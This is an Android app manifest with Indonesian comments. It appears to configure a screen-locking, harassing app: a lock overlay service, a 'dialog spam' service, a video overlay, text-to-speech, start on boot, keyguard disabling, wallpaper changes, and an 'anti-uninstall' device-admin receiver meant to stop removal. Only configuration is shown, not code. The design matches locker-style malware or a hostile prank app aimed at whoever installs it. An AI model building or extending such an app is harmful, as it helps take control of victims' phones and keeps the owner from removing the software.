<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- ═══ IZIN WAJIB (tidak muncul dialog) ═══ -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- ═══ IZIN OVERLAY (fokus utama, 1x perizinan) ═══ -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- ═══ IZIN NOTIFIKASI (WAJIB Android 13+, tidak bisa dihindari) ═══ -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- ═══ FOREGROUND SERVICE (wajib biar service gak dibunuh) ═══ -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />

    <!-- ═══ BATTERY OPT (opsional, biar service tahan) ═══ -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- ═══ FLASHLIGHT (tanpa dialog) ═══ -->
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />

    <!-- ═══ VIBRATE (tanpa dialog) ═══ -->
    <uses-permission android:name="android.permission.VIBRATE" />

    <!-- ═══ SET WALLPAPER (tanpa dialog) ═══ -->
    <uses-permission android:name="android.permission.SET_WALLPAPER" />

    <!-- ═══ DISABLE KEYGUARD (tanpa dialog) ═══ -->
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />

    <!-- ═══ ANTI-UNINSTALL (tanpa dialog, via device admin) ═══ -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- 🔥 DeviceService: cukup SPECIAL_USE (overlay + TTS + media) -->
        <service
            android:name=".DeviceService"
            android:exported="false"
            android:foregroundServiceType="specialUse" />

        <!-- Lock overlay -->
        <service
            android:name=".LockOverlayService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="specialUse" />

        <!-- TTS -->
        <service
            android:name=".TTSService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="specialUse" />

        <!-- Dialog spam -->
        <service
            android:name=".DialogSpamService"
            android:exported="false"
            android:stopWithTask="false" />

        <!-- Video overlay -->
        <service
            android:name=".VideoOverlayService"
            android:exported="false"
            android:stopWithTask="false" />

        <!-- Anti-uninstall Device Admin -->
        <receiver
            android:name=".AntiUninstallReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>